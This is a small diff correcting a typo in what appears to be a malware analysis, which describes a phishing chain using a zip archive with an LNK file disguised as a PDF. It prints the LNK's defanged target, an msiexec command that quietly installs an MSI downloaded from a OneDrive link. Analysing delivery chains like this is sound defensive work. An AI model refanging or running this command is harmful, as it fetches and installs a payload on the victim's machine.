@@ -8,7 +8,7 @@ The file is delivered to the victim via email, which prompts them to download an
 
 A Zip archive is downloaded, which contains a Lnk file, masquerading with a PDF icon.
 
-PDF Target Path (Defaned): 
+PDF Target Path (Defanged): 
 ```
 C:\Windows\System32\msiexec.exe -package hxxPs[:/\]onedrive.live[.]com/download?cid=85B4181C5D4F7514&resid=58504D327740F380%21149&authkey=AIHrvoeE31NvUiI&.msi -qn
 ```
